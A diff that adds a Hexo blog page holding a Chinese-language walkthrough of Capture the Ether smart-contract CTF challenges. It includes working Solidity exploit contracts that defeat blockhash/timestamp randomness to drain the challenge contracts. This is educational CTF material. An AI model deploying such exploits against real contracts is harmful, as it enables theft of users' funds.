@@ -1,0 +1,626 @@
+<!DOCTYPE html>
+<html lang="cn">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.1.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"karry-almond.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="区块链官方CTF题 write-up官方网站：https:&#x2F;&#x2F;capturetheether.com&#x2F;challenges&#x2F; 做题基本步骤：先下载好metamask插件并装载在浏览器上。登录metamask后点击题目左边的 Begin Challenge ，metamask会弹出是否发送消息的对话框，点击确定，之后会自动在Ropsten测试网上加载好ctf环境，之后就可以开始做题。完成题目后点击">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Karry blog">
+<meta property="og:url" content="https://karry-almond.github.io/2022/03/17/blockchain-ctf/index.html">
+<meta property="og:site_name" content="Karry blog">
+<meta property="og:description" content="区块链官方CTF题 write-up官方网站：https:&#x2F;&#x2F;capturetheether.com&#x2F;challenges&#x2F; 做题基本步骤：先下载好metamask插件并装载在浏览器上。登录metamask后点击题目左边的 Begin Challenge ，metamask会弹出是否发送消息的对话框，点击确定，之后会自动在Ropsten测试网上加载好ctf环境，之后就可以开始做题。完成题目后点击">
+<meta property="og:locale">
+<meta property="og:image" content="https://github.com/Karry-Almond/blog.io/raw/gh-pages/pic/blockchain-ctf-guessrandom1.png">
+<meta property="og:image" content="https://github.com/Karry-Almond/blog.io/raw/gh-pages/pic/blockchain-ctf-guessrandom2.png">
+<meta property="og:image" content="https://github.com/Karry-Almond/blog.io/raw/gh-pages/pic/blockchain-ctf-guessNew.png">
+<meta property="og:image" content="https://karry-almond.github.io/.gitbook/assets/blockchain-ctf-predictHash.png">
+<meta property="article:published_time" content="2022-03-17T13:25:43.373Z">
+<meta property="article:modified_time" content="2022-03-06T05:26:01.844Z">
+<meta property="article:author" content="Karry-Almond">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/Karry-Almond/blog.io/raw/gh-pages/pic/blockchain-ctf-guessrandom1.png">
+
+<link rel="canonical" href="https://karry-almond.github.io/2022/03/17/blockchain-ctf/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'cn'
+  };
+</script>
+
+  <title> | Karry blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="تشغيل شريط التصفح">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Karry blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>الأرشيفات</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="cn">
+    <link itemprop="mainEntityOfPage" href="https://karry-almond.github.io/2022/03/17/blockchain-ctf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Karry-Almond">
+      <meta itemprop="description" content="区块链">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Karry blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">نُشر في</span>
+
+              <time title="أُنشأ: 2022-03-17 21:25:43" itemprop="dateCreated datePublished" datetime="2022-03-17T21:25:43+08:00">2022-03-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">عُدل في</span>
+                <time title="عُدل: 2022-03-06 13:26:01" itemprop="dateModified" datetime="2022-03-06T13:26:01+08:00">2022-03-06</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="区块链官方CTF题-write-up"><a href="#区块链官方CTF题-write-up" class="headerlink" title="区块链官方CTF题 write-up"></a>区块链官方CTF题 write-up</h1><p>官方网站：<a target="_blank" rel="noopener" href="https://capturetheether.com/challenges/">https://capturetheether.com/challenges/</a></p>
+<p>做题基本步骤：先下载好metamask插件并装载在浏览器上。登录metamask后点击题目左边的 <code>Begin Challenge</code> ，metamask会弹出是否发送消息的对话框，点击确定，之后会自动在Ropsten测试网上加载好ctf环境，之后就可以开始做题。完成题目后点击 <code>Check Solution</code> ，同样metamask会弹出是否发送消息的对话框，点击确定，完成验证。</p>
+<h2 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h2><h3 id="Deploy-a-contract"><a href="#Deploy-a-contract" class="headerlink" title="Deploy a contract"></a><a target="_blank" rel="noopener" href="https://capturetheether.com/challenges/warmup/deploy/">Deploy a contract</a></h3><ul>
+<li>Write-Up</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">直接点击 Begin Challenge , metamask 会弹出是否发送消息的对话框，点击确定。</span><br><span class="line">Begin Challenge 的圈圈转好之后，点击 Check Solution ，同样metamask会弹出是否发送消息的对话框，点击确定。</span><br></pre></td></tr></table></figure>
+
+<h3 id="Call-me"><a href="#Call-me" class="headerlink" title="Call me"></a><a target="_blank" rel="noopener" href="https://capturetheether.com/challenges/warmup/call-me/">Call me</a></h3><ul>
+<li><p>Write-Up</p>
+<p>总结：要想调用一个已经在链上部署的合约的函数，一个比较简单的方法是把源代码复制在remix上，再在deploy中的at address 框中输入已部署的合约地址。必须要这样，remix才可以找到已部署的合约并使用。</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">打开 remix.ethereum.org 这个网址，新建一个合约文件，把solidity代码源码复制粘贴在合约文件中。</span><br><span class="line">在网址左侧找到 compile 栏，并单击右侧的compile按钮，编译该文件。</span><br><span class="line">在网址左侧找到 deploy 栏，environment下拉菜单中选择Injected Web3。</span><br><span class="line">在 deploy 栏中找到 at address ，在右侧框内输入题目中给的合约地址，点击 at address，下方会显示合约和合约函数列表，点击 callme 函数。</span><br><span class="line">完成</span><br></pre></td></tr></table></figure>
+
+<h3 id="Choose-a-nickname"><a href="#Choose-a-nickname" class="headerlink" title="Choose a nickname"></a><a target="_blank" rel="noopener" href="https://capturetheether.com/challenges/warmup/nickname/">Choose a nickname</a></h3><h2 id="Lotteries"><a href="#Lotteries" class="headerlink" title="Lotteries"></a>Lotteries</h2><h3 id="Guess-the-number"><a href="#Guess-the-number" class="headerlink" title="Guess the number"></a><a target="_blank" rel="noopener" href="https://capturetheether.com/challenges/lotteries/guess-the-number/">Guess the number</a></h3><h3 id="Guess-the-secret-number"><a href="#Guess-the-secret-number" class="headerlink" title="Guess the secret number"></a><a target="_blank" rel="noopener" href="https://capturetheether.com/challenges/lotteries/guess-the-secret-number/">Guess the secret number</a></h3><h3 id="Guess-the-random-number"><a href="#Guess-the-random-number" class="headerlink" title="Guess the random number"></a><a target="_blank" rel="noopener" href="https://capturetheether.com/challenges/lotteries/guess-the-random-number/">Guess the random number</a></h3><ul>
+<li><p>题目：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract GuessTheRandomNumberChallenge &#123;</span><br><span class="line">    uint8 answer;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">GuessTheRandomNumberChallenge</span><span class="params">()</span> public payable &#123;</span><br><span class="line">        require(msg.value == <span class="number">1</span> ether);</span><br><span class="line">        answer = uint8(keccak256(block.blockhash(block.number - <span class="number">1</span>), now));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">isComplete</span><span class="params">()</span> public view <span class="title function_">returns</span> <span class="params">(<span class="type">bool</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> address(this).balance == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">guess</span><span class="params">(uint8 n)</span> public payable &#123;</span><br><span class="line">        require(msg.value == <span class="number">1</span> ether);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (n == answer) &#123;</span><br><span class="line">            msg.sender.transfer(<span class="number">2</span> ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>Write-up</p>
+<p>虽然uint8只有255种可能，但是<code>isComplete()</code>要求<code>address(this).balance == 0</code>。那么一次环境只能<code>guess</code>一次。所以我们要在<code>guess</code>前，先计算出来answer的值。</p>
+<blockquote>
+<p>answer &#x3D; uint8(keccak256(block.blockhash(block.number - 1), now));</p>
+</blockquote>
+<blockquote>
+<p><code>block.number</code> 即本区块的区块号</p>
+<p><code>block.blockhash</code> 即目标区块号的区块哈希（<code>block.blockhash</code> 在 0.4.22 开始不推荐使用，在 0.5.0 已经移除了）</p>
+<p><code>now</code> 即本区块号的时间戳，其值等于block.timestamp（在 0.7.0, <code>now</code> 被移除了）</p>
+</blockquote>
+<p>在<code>etherscan.io</code>上搜索合约，以<code>0xe2d8265D24A4e1045008AEAD2175C46dFA55b834</code>这个合约地址为例。</p>
+<p><img src="https://github.com/Karry-Almond/blog.io/raw/gh-pages/pic/blockchain-ctf-guessrandom1.png"></p>
+<p><img src="https://github.com/Karry-Almond/blog.io/raw/gh-pages/pic/blockchain-ctf-guessrandom2.png"></p>
+<p>一号是block号，点击进去后可以查看blockhash，也可以切换到别的block号进行查看。得到</p>
+<blockquote>
+<p>block.blockhash(block.number - 1) &#x3D; 0xbf411fd6aafdb859366aa052324f4580e735387e4b49cf8d4828433c6b3eeed0</p>
+</blockquote>
+<p>二号是timestamp。也就是构造体中的<code>now</code>。得到<code>Feb-20-2022 07:28:53 AM +UTC</code>。我们通过随便一个时间戳转换网址，把<code>UTC时间转换成UNIX时间戳</code>，得到时间戳<code>1645342133</code>。</p>
+<p>接着构造一个合约用于计算<code>keccak256</code>，合约如下。执行合约得解。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheRandomNumberChallenge &#123;</span><br><span class="line">    uint8 public answer;</span><br><span class="line"></span><br><span class="line">    function guess() public payable returns(uint8)&#123;</span><br><span class="line">		answer = uint8(keccak256(bytes32(0xbf411fd6aafdb859366aa052324f4580e735387e4b49cf8d4828433c6b3eeed0), uint(1645342133)));</span><br><span class="line">		</span><br><span class="line">		return answer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意：要把<code>0xbf411fd6aafdb859366aa052324f4580e735387e4b49cf8d4828433c6b3eeed0</code>转换成<code>bytes32</code>，把<code>1645342133</code>转换成<code>uint</code>格式。</p>
+<p>因为<code>block.blockhash</code>返回值是<code>bytes32</code>，<code>now</code>返回值是<code>uint</code></p>
+</blockquote>
+</li>
+</ul>
+<h3 id="Guess-the-new-number"><a href="#Guess-the-new-number" class="headerlink" title="Guess the new number"></a><a target="_blank" rel="noopener" href="https://capturetheether.com/challenges/lotteries/guess-the-new-number/">Guess the new number</a></h3><ul>
+<li><p>题目</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheNewNumberChallenge &#123;</span><br><span class="line">    function GuessTheNewNumberChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));</span><br><span class="line"></span><br><span class="line">        if (n == answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>Write-Up</p>
+<p>该题目的keccak256计算是跟随函数一起执行的，所以无法使用“提前算出answer，手动执行函数”的思路。但是只需要answer的计算和guess中处于同一个区块即可。</p>
+<blockquote>
+<p>思路：创建另外一个合约函数，在新函数内部计算<code>uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now))</code>，再调用<code>guess(uint8 n)</code>，<code>answer</code>作为<code>guess(uint8 n)</code>的参数。</p>
+<p>即可实现answer的计算和guess(uint8 n)在同一个区块。</p>
+</blockquote>
+<p>攻击合约如下：</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheNewNumberChallenge &#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract exploit&#123;</span><br><span class="line"></span><br><span class="line">    function deposit() payable returns (uint)&#123;</span><br><span class="line">        return msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function withdraw() payable &#123;</span><br><span class="line">        msg.sender.transfer(this.balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attacker(address addr) &#123;</span><br><span class="line">        require(this.balance &gt;= 1 ether);</span><br><span class="line"></span><br><span class="line">        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));</span><br><span class="line"></span><br><span class="line">        GuessTheNewNumberChallenge guessContract = GuessTheNewNumberChallenge(addr);</span><br><span class="line">        guessContract.guess.value(1 ether)(answer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function () payable&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>做的时候思路一开始就正确了，但是实现的时候总是报<code>transaction revert error</code>。</p>
+<p><strong>这里有几个点需要特别注意理解：</strong></p>
+<ol>
+<li><p><code>guessContract.guess.value(1 ether)(answer);</code></p>
+<p>.value()是写在函数名和括号之间的。</p>
+</li>
+<li><p><code>function () payable&#123;&#125;</code></p>
+<p><strong>非常重要！！！</strong></p>
+<p>就是因为没有写支持<code>payable</code>的<code>fallback</code>函数导致一直报</p>
+<blockquote>
+<p><code>Gas estimation failed:execution reverted</code>。</p>
+</blockquote>
+<p>原因是<code>guess(uint8)</code>函数中有一条<code>msg.sender.transfer(2 ether);</code>会产生带有以太的回调。如果回调函数（即fallback函数）没有<code>payable</code>关键字，那就会报错。</p>
+<p><img src="https://github.com/Karry-Almond/blog.io/raw/gh-pages/pic/blockchain-ctf-guessNew.png"></p>
+</li>
+<li><p><code>function attacker(address addr) &#123;&#125;</code></p>
+<p>这个函数没有使用<code>payable</code>关键字，但是内部却使用了.value()。换言之，<code>payable</code>关键字的含义是“<strong>调用该函数时</strong>是否可以携带以太”。</p>
+<p>该函数调用别的函数时，只要别的函数有<code>payable</code>关键字就可以。</p>
+</li>
+</ol>
+</li>
+</ul>
+<h3 id="Predict-the-future"><a href="#Predict-the-future" class="headerlink" title="Predict the future"></a><a target="_blank" rel="noopener" href="https://capturetheether.com/challenges/lotteries/predict-the-future/">Predict the future</a></h3><ul>
+<li>题目</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract PredictTheFutureChallenge &#123;</span><br><span class="line">    address guesser;</span><br><span class="line">    uint8 guess;</span><br><span class="line">    uint256 settlementBlockNumber;</span><br><span class="line"></span><br><span class="line">    function PredictTheFutureChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function lockInGuess(uint8 n) public payable &#123;</span><br><span class="line">        require(guesser == 0);</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line"></span><br><span class="line">        guesser = msg.sender;</span><br><span class="line">        guess = n;</span><br><span class="line">        settlementBlockNumber = block.number + 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function settle() public &#123;</span><br><span class="line">        require(msg.sender == guesser);</span><br><span class="line">        require(block.number &gt; settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;</span><br><span class="line"></span><br><span class="line">        guesser = 0;</span><br><span class="line">        if (guess == answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>Write-Up</p>
+<p>题目含义是answer的设置必须在<code>keccak256</code>的区块之前就进行。</p>
+<p>一开始的思路是能否确定<code>settle()</code>函数在哪个区块被执行，然后根据这个answer先计算。发现根本不可能确定具体在哪个区块被执行，遂放弃这个思路。</p>
+<p>重点是在于answer模了10，那么这个answer的可取值范围就很小了。开始考虑爆破。</p>
+<p>题目最后验证的是合约没有以太。如果我们执行了一次<code>settle()</code>又失败了，那么由于 <code>guesser= 0;</code>，guesser被重置，又要执行一次<code>lockInGuess(uint8 n)</code>，就又增加了1 ether。那么最后即使answer猜中了，验证也不会通过。所以我们必须执行仅仅一次<code>settle()</code>就成功。实现一个合约，在调用<code>settle()</code>前先判断一下answer是否猜中即可。</p>
+<p>攻击合约的代码如下：</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract PredictTheFutureChallenge &#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract exploit&#123;</span><br><span class="line">    uint8 guess;</span><br><span class="line">    address addr_predContract;</span><br><span class="line"></span><br><span class="line">    function callLockInGuess(uint8 n,address addr) payable &#123;</span><br><span class="line">        guess = n;</span><br><span class="line">        addr_predContract = addr;</span><br><span class="line">        PredictTheFutureChallenge predContract = PredictTheFutureChallenge(addr_predContract);</span><br><span class="line">        predContract.lockInGuess.value(1 ether)(guess);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attacker()&#123;</span><br><span class="line">        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;</span><br><span class="line"></span><br><span class="line">        require(answer == guess);</span><br><span class="line"></span><br><span class="line">        PredictTheFutureChallenge predContract = PredictTheFutureChallenge(addr_predContract);</span><br><span class="line">        predContract.settle();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() payable&#123;</span><br><span class="line">        msg.sender.transfer(this.balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function () payable &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行流程：</p>
+<ol>
+<li><p>首先执行 <code>callLockInGuess(uint8 n,address addr)</code></p>
+<p>n随便填一个0-9的数，addr是挑战的地址。</p>
+</li>
+<li><p>多点几次<code>attacker()</code>，不管警告。多半会返回transaction fail，直到transaction success为止。当然也可以写个脚本发送请求，但是由于爆破的范围很小，手动点几下基本都可以碰撞成功。</p>
+</li>
+</ol>
+<p>注意：在remix上执行的时候，一般情况都会出现<code>revert error</code></p>
+<blockquote>
+<p><code>Gas estimation failed:execution reverted</code>。</p>
+</blockquote>
+<p>也可能没有错误提示，直接可以执行。</p>
+<p>不管有没有出现错误提示，直接执行即可。出现错误提示仅仅意味着，在以太坊节点模拟执行的时候会出错，这是因为根据模拟执行的最新区块号算出的answer不正确。不出现错误也仅仅意味着根据模拟执行的最新区块号算出的answer正确。只有根据实际执行的最新区块号算出的answer正确才行，所以直接一直执行就可以了。</p>
+<h3 id="Predict-the-block-hash"><a href="#Predict-the-block-hash" class="headerlink" title="Predict the block hash"></a><a target="_blank" rel="noopener" href="https://capturetheether.com/challenges/lotteries/predict-the-block-hash/">Predict the block hash</a></h3><ul>
+<li>题目</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract PredictTheBlockHashChallenge &#123;</span><br><span class="line">    address guesser;</span><br><span class="line">    bytes32 guess;</span><br><span class="line">    uint256 settlementBlockNumber;</span><br><span class="line"></span><br><span class="line">    function PredictTheBlockHashChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function lockInGuess(bytes32 hash) public payable &#123;</span><br><span class="line">        require(guesser == 0);</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line"></span><br><span class="line">        guesser = msg.sender;</span><br><span class="line">        guess = hash;</span><br><span class="line">        settlementBlockNumber = block.number + 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function settle() public &#123;</span><br><span class="line">        require(msg.sender == guesser);</span><br><span class="line">        require(block.number &gt; settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        bytes32 answer = block.blockhash(settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        guesser = 0;</span><br><span class="line">        if (guess == answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Write-Up</li>
+</ul>
+<p><img src="/.gitbook/assets/blockchain-ctf-predictHash.png"></p>
